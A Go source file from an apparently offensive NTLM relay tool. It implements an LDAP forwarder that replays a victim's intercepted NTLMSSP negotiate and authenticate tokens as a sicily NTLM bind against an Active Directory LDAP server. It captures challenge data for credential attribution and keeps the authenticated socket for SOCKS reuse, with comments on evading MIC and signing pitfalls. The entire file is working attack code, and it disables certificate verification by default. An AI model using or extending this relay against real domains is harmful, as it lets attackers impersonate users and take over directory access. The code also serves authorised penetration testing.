// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/jfjallid/go-smb/ntlmssp"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/server"
)

// LDAP protocol op tags (BER application class). Only the values used in this
// file are listed; the passthrough adds others as needed.
const (
	ldapAppBindRequest      ber.Tag = 0  // [APPLICATION 0]
	ldapAppBindResponse     ber.Tag = 1  // [APPLICATION 1]
	ldapAppExtendedRequest  ber.Tag = 23 // [APPLICATION 23]
	ldapAppExtendedResponse ber.Tag = 24 // [APPLICATION 24]
)

// LDAP result codes.
const (
	ldapResultSuccess            = 0
	ldapResultSaslBindInProgress = 14
)

// startTLSOID is the OID for the LDAP StartTLS Extended Request (RFC 4511 §4.14.1).
const startTLSOID = "1.3.6.1.4.1.1466.20037"

// NTLM bind auth choice tags (within BindRequest). These match the LDAP
// sicily extension's [CONTEXT 10] / [CONTEXT 11] primitive tags. We alias the
// matching ber.TagEnumerated/TagEmbeddedPDV constants because the BER library
// only auto-writes the raw byte payload under ClassContext when the tag value
// is 10 or 11 — the same convention goldap follows.
const (
	ldapAuthNTLMNegotiate    = ber.TagEnumerated  // 10
	ldapAuthNTLMAuthenticate = ber.TagEmbeddedPDV // 11
)

// ldapUpstream wraps the raw TCP/TLS socket on which an NTLM bind has been
// completed. Ownership of the socket is exclusive — the bind path uses it
// directly (no goldap.Conn wrapper) so it can be handed off to
// LDAPPassthrough after success.
type ldapUpstream struct {
	Target Target

	mu     sync.Mutex
	conn   net.Conn
	closed bool

	// nextMessageID tracks LDAP MessageID allocation on this socket. The bind
	// used IDs 1 and 2; downstream passthrough allocations start at 3.
	idMu          sync.Mutex
	nextMessageID int64
}

// Close tears down the LDAP socket. Idempotent.
func (u *ldapUpstream) Close() error {
	u.mu.Lock()
	defer u.mu.Unlock()
	if u.closed {
		return nil
	}
	u.closed = true
	if u.conn != nil {
		return u.conn.Close()
	}
	return nil
}

// IsClosed reports whether Close has been called.
func (u *ldapUpstream) IsClosed() bool {
	u.mu.Lock()
	defer u.mu.Unlock()
	return u.closed
}

// Conn returns the bound raw socket for callers that hold the upstream.
// Returns nil after Close.
func (u *ldapUpstream) Conn() net.Conn {
	u.mu.Lock()
	defer u.mu.Unlock()
	if u.closed {
		return nil
	}
	return u.conn
}

// allocMessageID returns the next free LDAP MessageID on this socket.
func (u *ldapUpstream) allocMessageID() int64 {
	u.idMu.Lock()
	defer u.idMu.Unlock()
	u.nextMessageID++
	return u.nextMessageID
}

// ldapForwarder drives an upstream NTLMSSP bind over LDAP/LDAPS on behalf of a
// relayed inbound auth. It speaks BER directly on the upstream socket so the
// raw connection survives the bind and can be passed to LDAPPassthrough for
// SOCKS-side reuse.
type ldapForwarder struct {
	target          Target
	timeout         time.Duration
	tlsConf         *tls.Config
	disableStartTLS bool
	logger          server.Logger

	upstream        *ldapUpstream
	serverChallenge [8]byte
}

func newLDAPForwarder(t Target, timeout time.Duration, tlsConfig *tls.Config, disableStartTLS bool, logger server.Logger) *ldapForwarder {
	if timeout <= 0 {
		timeout = 10 * time.Second
	}
	return &ldapForwarder{
		target:          t,
		timeout:         timeout,
		tlsConf:         tlsConfig,
		disableStartTLS: disableStartTLS,
		logger:          logger,
	}
}

// Target satisfies the Forwarder interface.
func (f *ldapForwarder) Target() Target { return f.target }

// Negotiate dials the upstream LDAP server, sends BindRequest leg 1 carrying
// the inbound's NTLMSSP NEGOTIATE token, and returns the upstream's NTLMSSP
// CHALLENGE token. AD's sicily NTLM bind packs the CHALLENGE into matchedDN
// (BindResponse.Children[1]) rather than the standard serverSaslCreds
// [CONTEXT 7] slot; the parser checks both. If neither location holds a
// CHALLENGE the upstream treated the bind as something other than sicily NTLM
// — typically falling through to an anonymous success on DCs that allow
// unauthenticated binds — and the relay refuses, since the user expects an
// authenticated relay outcome.
func (f *ldapForwarder) Negotiate(negotiate []byte) ([]byte, error) {
	if f.upstream != nil {
		return nil, fmt.Errorf("Negotiate called twice")
	}
	if len(negotiate) < 8 || string(negotiate[:7]) != "NTLMSSP" {
		return nil, fmt.Errorf("Negotiate: not an NTLMSSP message")
	}

	// ntlmrelayx-style early refusal. If the inbound victim's NTLM client
	// requested SIGN/SEAL/ALWAYS_SIGN, the bind will succeed for plain ldap
	// but every post-bind LDAP message gets dropped by AD on the upstream side
	// because the relay has no way to sign without the victim's session keys.
	// Abort before dialing the upstream so no doomed session lands in the pool.
	// The surrounding listener will surface the error via OnRelayFailure and
	// send the inbound client a logon failure.
	// For LDAPS connections, the authentication will fail because
	// signing/sealing is not allowed over TLS.
	if inboundRequestsSigning(negotiate) {
		return nil, fmt.Errorf("the client requested signing — relaying to LDAP will not work " +
			"(this usually happens when relaying from SMB to LDAP)")
	}

	up, err := f.dialUpstream()
	if err != nil {
		return nil, err
	}

	// Leg 1: send BindRequest{ auth=[CONTEXT 10] negotiate }. The MessageID is
	// allocated via allocMessageID so a preceding StartTLS exchange (when used)
	// doesn't collide.
	//
	// The NEGOTIATE is forwarded verbatim: any modification (e.g. stripping
	// SIGN/SEAL flags to avoid post-bind signing) invalidates the MIC that
	// the victim computes over NEGOTIATE+CHALLENGE+AUTHENTICATE, and modern
	// AD strictly rejects bad MICs.
	if err := up.writeLDAPMessage(up.allocMessageID(), encodeBindRequest(ldapAuthNTLMNegotiate, negotiate)); err != nil {
		up.Close()
		return nil, fmt.Errorf("write BindRequest leg 1: %w", err)
	}
	resp, err := up.readLDAPMessage()
	if err != nil {
		up.Close()
		return nil, fmt.Errorf("read BindResponse leg 1: %w", err)
	}
	serverSaslCreds, err := parseBindNegotiateResponse(resp)
	if err != nil {
		up.Close()
		return nil, fmt.Errorf("%w", err)
	}

	// Capture the 8-byte ServerChallenge from the NTLMSSP CHALLENGE for
	// credential attribution. Failure is non-fatal.
	parsed := ntlmssp.NewChallenge()
	if err := parsed.UnmarshalBinary(serverSaslCreds); err == nil {
		var b [8]byte
		for i := 0; i < 8; i++ {
			b[i] = byte(parsed.ServerChallenge >> (8 * i))
		}
		f.serverChallenge = b
	} else if f.logger != nil {
		f.logger.Debugf("decode upstream CHALLENGE: %v", err)
	}

	f.upstream = up
	return serverSaslCreds, nil
}

// Authenticate forwards the inbound's raw NTLMSSP AUTHENTICATE token to the
// upstream as BindRequest leg 2 and returns the captured Credential plus an
// NT-style status. mic is ignored — LDAP NTLM bind carries no SPNEGO MIC.
func (f *ldapForwarder) Authenticate(remote net.Addr, authenticate, mic []byte) (*Credential, uint32, error) {
	_ = mic
	if f.upstream == nil {
		return nil, 0, fmt.Errorf("Authenticate without prior Negotiate")
	}
	if len(authenticate) < 8 || string(authenticate[:7]) != "NTLMSSP" {
		return nil, 0, fmt.Errorf("Authenticate: not an NTLMSSP message")
	}
	var auth ntlmssp.Authenticate
	if err := auth.UnmarshalBinary(authenticate); err != nil {
		return nil, 0, fmt.Errorf("decode AUTHENTICATE: %w", err)
	}
	cred := buildCredentialFromAuth(&auth, f.serverChallenge, remote)

	if err := f.upstream.writeLDAPMessage(f.upstream.allocMessageID(), encodeBindRequest(ldapAuthNTLMAuthenticate, authenticate)); err != nil {
		return cred, 0, fmt.Errorf("write BindRequest leg 2: %w", err)
	}
	resp, err := f.upstream.readLDAPMessage()
	if err != nil {
		return cred, 0, fmt.Errorf("read BindResponse leg 2: %w", err)
	}
	resultCode, matchedDN, diagnostic, err := parseBindResultCode(resp)
	if err != nil {
		return cred, 0, fmt.Errorf("parse BindResponse leg 2: %w", err)
	}
	if resultCode != ldapResultSuccess {
		return cred, smb.StatusLogonFailure, formatBindFailure(resultCode, matchedDN, diagnostic)
	}
	return cred, smb.StatusOk, nil
}

// formatBindFailure produces a human-readable error describing why the LDAP
// server rejected a bind. AD encodes the WIN32 substatus inside
// diagnosticMessage as `... data NNN, vXXXX` — surfacing that string lets the
// caller distinguish channel binding (data 80090346), wrong creds (data 52e),
// disabled account (data 533), expired pw (data 532), etc.
func formatBindFailure(resultCode int, matchedDN, diagnostic string) error {
	if diagnostic == "" && matchedDN == "" {
		return fmt.Errorf("LDAP bind rejected (resultCode=%d)", resultCode)
	}
	parts := fmt.Sprintf("resultCode=%d", resultCode)
	if matchedDN != "" {
		parts += fmt.Sprintf(" matchedDN=%q", matchedDN)
	}
	if diagnostic != "" {
		parts += fmt.Sprintf(" diagnosticMessage=%q", diagnostic)
	}
	return fmt.Errorf("LDAP bind rejected (%s)", parts)
}

// Take returns the upstream and zeroes the field. Close is a no-op afterwards.
func (f *ldapForwarder) Take() *ldapUpstream {
	up := f.upstream
	f.upstream = nil
	return up
}

// Close tears down the upstream connection if still owned. Idempotent.
func (f *ldapForwarder) Close() {
	if f.upstream == nil {
		return
	}
	f.upstream.Close()
	f.upstream = nil
}

// dialUpstream opens a TCP connection to the LDAP target and applies any
// pre-bind TLS upgrade:
//   - ldaps:// → immediate TLS handshake on the freshly-dialed socket.
//   - ldap:// with StartTLS enabled (default) → plain TCP, then the StartTLS
//     ExtendedRequest. On a clean rejection from the server (resultCode != 0)
//     the relay logs at Debug and continues with plain LDAP on the same socket.
//   - ldap:// with StartTLS disabled, or after a StartTLS rejection → plain TCP.
//
// Errors from the StartTLS exchange that aren't a clean protocol-level rejection
// (TCP read/write failures, malformed BER, TLS handshake failures) abort and
// close the socket — partway-through-StartTLS leaves the connection unsafe to
// fall back from.
func (f *ldapForwarder) dialUpstream() (*ldapUpstream, error) {
	d := &net.Dialer{Timeout: f.timeout}
	rawConn, err := d.Dial("tcp", f.target.Host)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", f.target.Host, err)
	}
	up := &ldapUpstream{Target: f.target, conn: rawConn}

	if f.target.TLS {
		tlsConn := tls.Client(rawConn, f.resolveTLSConfig())
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return nil, fmt.Errorf("TLS handshake %s: %w", f.target.Host, err)
		}
		up.conn = tlsConn
		return up, nil
	}

	if f.target.Protocol == ProtoLDAP && !f.disableStartTLS {
		if err := f.tryStartTLS(up); err != nil {
			up.Close()
			return nil, fmt.Errorf("StartTLS %s: %w", f.target.Host, err)
		}
	}
	return up, nil
}

// resolveTLSConfig returns a tls.Config to use for TLS handshakes against the
// upstream. When the caller supplied a config without a ServerName, the host
// portion of the target is filled in on a clone so concurrent dials don't race
// on the same struct. When no config was supplied, InsecureSkipVerify=true is
// the historical default — matching the prior ldaps:// behavior.
func (f *ldapForwarder) resolveTLSConfig() *tls.Config {
	host, _, _ := net.SplitHostPort(f.target.Host)
	tlsCfg := f.tlsConf
	if tlsCfg == nil {
		return &tls.Config{ServerName: host, InsecureSkipVerify: true}
	}
	if tlsCfg.ServerName == "" {
		cloned := tlsCfg.Clone()
		cloned.ServerName = host
		return cloned
	}
	return tlsCfg
}

// tryStartTLS sends the StartTLS ExtendedRequest on up.conn. On success
// (resultCode 0) it performs the TLS handshake and replaces up.conn with the
// TLS-wrapped socket. On a server-side rejection (resultCode != 0) it leaves
// up.conn untouched and returns nil — the caller continues with plain LDAP.
// Any other failure (write/read error, malformed BER, TLS handshake failure)
// is returned and the caller must treat the socket as unusable.
func (f *ldapForwarder) tryStartTLS(up *ldapUpstream) error {
	id := up.allocMessageID()
	if err := up.writeLDAPMessage(id, encodeStartTLSRequest()); err != nil {
		return fmt.Errorf("write ExtendedRequest: %w", err)
	}
	resp, err := up.readLDAPMessage()
	if err != nil {
		return fmt.Errorf("read ExtendedResponse: %w", err)
	}
	rc, err := parseStartTLSResponse(resp)
	if err != nil {
		return fmt.Errorf("parse ExtendedResponse: %w", err)
	}
	if rc != ldapResultSuccess {
		if f.logger != nil {
			f.logger.Debugf("StartTLS unsupported by %s (resultCode=%d) — falling back to plain LDAP", f.target.Host, rc)
		}
		return nil
	}
	tlsConn := tls.Client(up.conn, f.resolveTLSConfig())
	if err := tlsConn.Handshake(); err != nil {
		return fmt.Errorf("TLS handshake: %w", err)
	}
	up.mu.Lock()
	up.conn = tlsConn
	up.mu.Unlock()
	if f.logger != nil {
		f.logger.Debugf("StartTLS established with %s", f.target.Host)
	}
	return nil
}

// encodeStartTLSRequest builds an ExtendedRequest carrying the StartTLS OID.
// Shape: [APPLICATION 23] SEQUENCE { [CONTEXT 0] PRIMITIVE OID-bytes }.
func encodeStartTLSRequest() *ber.Packet {
	req := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppExtendedRequest, nil, "ExtendedRequest")
	req.AppendChild(ber.NewString(ber.ClassContext, ber.TypePrimitive, 0, startTLSOID, "requestName"))
	return req
}

// parseStartTLSResponse extracts the resultCode from an ExtendedResponse
// envelope. Returns the resultCode and a nil error when the envelope is
// structurally valid (regardless of whether resultCode signals success).
// Returns a non-nil error only when the envelope isn't an ExtendedResponse or
// is missing the resultCode field.
func parseStartTLSResponse(env *ber.Packet) (int, error) {
	if env == nil || len(env.Children) < 2 {
		return 0, fmt.Errorf("envelope missing messageID/protocolOp")
	}
	resp := env.Children[1]
	if resp.ClassType != ber.ClassApplication || resp.Tag != ldapAppExtendedResponse {
		return 0, fmt.Errorf("not an ExtendedResponse (class=%d tag=%d)", resp.ClassType, resp.Tag)
	}
	if len(resp.Children) == 0 {
		return 0, fmt.Errorf("ExtendedResponse missing resultCode")
	}
	v, ok := resp.Children[0].Value.(int64)
	if !ok {
		return 0, fmt.Errorf("ExtendedResponse resultCode not an integer")
	}
	return int(v), nil
}

// writeLDAPMessage serializes a complete LDAPMessage envelope (SEQUENCE
// {messageID INTEGER, protocolOp}) and writes it to the upstream. Holds the
// connection's write side via mu so the bind sequence is atomic.
func (u *ldapUpstream) writeLDAPMessage(messageID int64, protocolOp *ber.Packet) error {
	u.mu.Lock()
	defer u.mu.Unlock()
	if u.closed {
		return fmt.Errorf("upstream closed")
	}
	env := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAPMessage")
	env.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, messageID, "MessageID"))
	env.AppendChild(protocolOp)
	_, err := u.conn.Write(env.Bytes())
	return err
}

// readLDAPMessage reads one complete LDAPMessage envelope from the upstream.
// Holds mu for the duration so concurrent writes don't interleave the parser.
func (u *ldapUpstream) readLDAPMessage() (*ber.Packet, error) {
	u.mu.Lock()
	defer u.mu.Unlock()
	if u.closed {
		return nil, fmt.Errorf("upstream closed")
	}
	return ber.ReadPacket(u.conn)
}

// encodeBindRequest builds a BindRequest packet carrying an NTLMSSP token as
// the auth choice. authTag picks Phase 1 ([CONTEXT 10]) vs Phase 2
// ([CONTEXT 11]) — the sicily NTLM extension's two tags.
func encodeBindRequest(authTag ber.Tag, ntlm []byte) *ber.Packet {
	req := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ber.Tag(ldapAppBindRequest), nil, "BindRequest")
	req.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, int64(3), "Version"))
	req.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, authTag, ntlm, "authentication")
	req.AppendChild(auth)
	return req
}

// extractBindResponse returns the BindResponse application packet from an
// LDAPMessage envelope and the parsed resultCode (-1 when absent).
func extractBindResponse(env *ber.Packet) (*ber.Packet, int, error) {
	if env == nil || len(env.Children) < 2 {
		return nil, -1, fmt.Errorf("envelope missing messageID/protocolOp")
	}
	resp := env.Children[1]
	if resp.ClassType != ber.ClassApplication || resp.Tag != ber.Tag(ldapAppBindResponse) {
		return nil, -1, fmt.Errorf("not a BindResponse (class=%d tag=%d)", resp.ClassType, resp.Tag)
	}
	rc := -1
	if len(resp.Children) > 0 {
		if v, ok := resp.Children[0].Value.(int64); ok {
			rc = int(v)
		}
	}
	return resp, rc, nil
}

// bindResponseDiagnostic returns the matchedDN and diagnosticMessage strings
// from a BindResponse, when present. AD packs the WIN32 substatus into
// diagnosticMessage as `... data NNN, vXXXX` — the `NNN` is the actual reason
// (e.g. 532 = password expired, 80090346 = channel binding mismatch).
func bindResponseDiagnostic(resp *ber.Packet) (matchedDN, diagnostic string) {
	if resp == nil {
		return "", ""
	}
	if len(resp.Children) > 1 {
		if s, ok := resp.Children[1].Value.(string); ok {
			matchedDN = s
		}
	}
	if len(resp.Children) > 2 {
		if s, ok := resp.Children[2].Value.(string); ok {
			diagnostic = s
		}
	}
	return matchedDN, diagnostic
}

// parseBindNegotiateResponse extracts the NTLMSSP CHALLENGE from a Phase-1
// BindResponse. AD's sicily NTLM puts the CHALLENGE in matchedDN
// (Children[1]) as an OctetString — non-standard but stable Microsoft
// behavior; goldap uses the same trick. We also check the spec-correct
// serverSaslCreds [CONTEXT 7] slot in case a non-Microsoft server uses it.
//
// If neither location holds an NTLMSSP token the upstream treated the bind
// as something other than sicily NTLM (most commonly anonymous on a DC that
// permits unauthenticated binds). Returns an error including the resultCode
// so the caller can surface a clear diagnostic.
func parseBindNegotiateResponse(env *ber.Packet) ([]byte, error) {
	resp, rc, err := extractBindResponse(env)
	if err != nil {
		return nil, err
	}

	// Microsoft AD layout: CHALLENGE in matchedDN (Children[1]).
	if len(resp.Children) >= 2 {
		c := resp.Children[1]
		if c.ClassType == ber.ClassUniversal && c.Tag == ber.TagOctetString {
			if b := c.ByteValue; len(b) >= 7 && string(b[:7]) == "NTLMSSP" {
				return append([]byte(nil), b...), nil
			}
		}
	}

	// Standard LDAP layout: serverSaslCreds [CONTEXT 7] at any trailing index.
	for i := 3; i < len(resp.Children); i++ {
		c := resp.Children[i]
		if c.ClassType == ber.ClassContext && c.Tag == 7 {
			if b := c.Data.Bytes(); len(b) >= 7 && string(b[:7]) == "NTLMSSP" {
				return append([]byte(nil), b...), nil
			}
		}
	}

	return nil, fmt.Errorf("upstream BindResponse missing NTLMSSP CHALLENGE (resultCode=%d) — sicily NTLM may be disabled, or the bind was treated as anonymous", rc)
}

// inboundRequestsSigning reports whether a raw NTLMSSP NEGOTIATE message has
// SIGN or SEAL set — the two flags that signal the client actually wants
// message integrity/confidentiality on the payload. ALWAYS_SIGN is
// intentionally excluded: it only forces session-key generation as a
// downlevel fallback and is set by clients that won't enforce signing on the
// wire, so warning on it produces noise. The NegotiateFlags field is at
// offset 12-16 of the NEGOTIATE message (after the 8-byte signature and the
// 4-byte MessageType). Returns false on malformed input — failing closed
// avoids spurious warnings.
func inboundRequestsSigning(neg []byte) bool {
	if len(neg) < 16 || string(neg[:7]) != "NTLMSSP" {
		return false
	}
	if binary.LittleEndian.Uint32(neg[8:12]) != ntlmssp.TypeNtLmNegotiate {
		return false
	}
	flags := binary.LittleEndian.Uint32(neg[12:16])
	return flags&(ntlmssp.FlgNegSign|ntlmssp.FlgNegSeal) != 0
}

// parseBindResultCode extracts the resultCode, matchedDN, and
// diagnosticMessage from a BindResponse. Used after the inbound's AUTHENTICATE
// has been forwarded — at that point the upstream either binds successfully
// (resultCode=0) or rejects (non-zero). AD encodes the precise reason for
// rejection in diagnosticMessage as `... data NNN, vXXXX`.
func parseBindResultCode(env *ber.Packet) (int, string, string, error) {
	resp, rc, err := extractBindResponse(env)
	if err != nil {
		return 0, "", "", err
	}
	if rc < 0 {
		return 0, "", "", fmt.Errorf("BindResponse missing resultCode")
	}
	matchedDN, diagnostic := bindResponseDiagnostic(resp)
	return rc, matchedDN, diagnostic, nil
}
